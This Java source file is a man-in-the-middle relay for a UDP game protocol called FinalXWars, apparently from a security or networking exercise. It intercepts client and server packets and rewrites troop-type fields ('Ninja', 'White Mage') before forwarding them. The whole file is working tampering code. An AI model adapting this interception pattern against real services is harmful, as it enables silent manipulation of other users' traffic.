import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.concurrent.CopyOnWriteArrayList;

import javax.swing.JOptionPane;


public class FinalXWars_MITM {
	static CopyOnWriteArrayList<GameCommunicator> clientlist = new CopyOnWriteArrayList<GameCommunicator>();
	public static void main(String[] args){
		GameCommunicator gc = null;
	
		
		try {
			 String ip = JOptionPane.showInputDialog("Please input IP Address of Game Core / Server");
				//String port = JOptionPane.showInputDialog("Please input Port no of Game Core");
				gc = new GameCommunicator(InetAddress.getByName(ip), Integer.parseInt("10224"));
			gc.sendMessage("MMIDCONN#OK".getBytes());
			

			DatagramSocket datagramSocket = new DatagramSocket(10225); 
			byte[] buffer = new byte[1000];
			DatagramPacket packet = new DatagramPacket(buffer, buffer.length);
			
			Runnable k = new Runnable(){

				@Override
				public void run() {
					// TODO Auto-generated method stub
					DatagramSocket datagramSocket2 = null;
					try {
						datagramSocket2 = new DatagramSocket(10226);
					} catch (SocketException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					} 
					byte[] buffer2 = new byte[1000];
					DatagramPacket packet2 = new DatagramPacket(buffer2, buffer2.length);
					
					while(true){
						buffer2 = new byte[1000];
			  		    packet2 = new DatagramPacket(buffer2, buffer2.length);
			    		try {
							datagramSocket2.receive(packet2);
						} catch (IOException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}	
			    		
			    		
			    		//Parse the data
			    		String data = new String(packet2.getData());
			    		String [] split = data.split("#");
			    		
			    		//System.out.println(data);
			    		if(split[0].equals("CLICON")){
			    			System.out.println("MAN IN THE MIDDLE RECEIVED: "+new String(packet2.getData())+"\n");
			    			try {
								clientlist.add(new GameCommunicator(InetAddress.getByName(split[1].substring(1)), Integer.parseInt(split[2].trim())));
							} catch (NumberFormatException e) {
								// TODO Auto-generated catch block
								e.printStackTrace();
							} catch (UnknownHostException e) {
								// TODO Auto-generated catch block
								e.printStackTrace();
							} catch (IOException e) {
								// TODO Auto-generated catch block
								e.printStackTrace();
							}
			    		}else if(split[0].equals("TROOPUPD")){
							data = "";
							
							split[7] = "White Mage";
							
							for(int i=0; i<split.length;i++){
				    			data = data+split[i]+"#";
				    		}
							broadcast(data.getBytes());
						}
					}
				}
				
			};
			
			Thread l = new Thread(k);
			l.start();
			
			while(true){
				buffer = new byte[1000];
	  		    packet = new DatagramPacket(buffer, buffer.length);
	    		datagramSocket.receive(packet);	
	    		
	    		
	    		//Parse the data
	    		String data = new String(packet.getData());
	    		String [] split = data.split("#");
	    		 if(split[0].equals("TROOP")){

		    		split[2] = "Ninja";
		    		split[6] = "Ninja";
		    		data = "";
		    		
		    		for(int i=0; i<split.length;i++){
		    			data = data+split[i]+"#";
		    		}
		    		
		    		System.out.println("Sendsh"+data);
		    		
		    		gc.sendMessage(data.getBytes());
		    		
				
			
				}
	    			
			}
			
			
		   
		} catch (NumberFormatException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (UnknownHostException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		
	
	}
	
	  public static void broadcast(byte[] buffer) {
		   for(GameCommunicator i: clientlist){   	
			   i.sendMessage(buffer);   	
		   } 
	   }
	
}
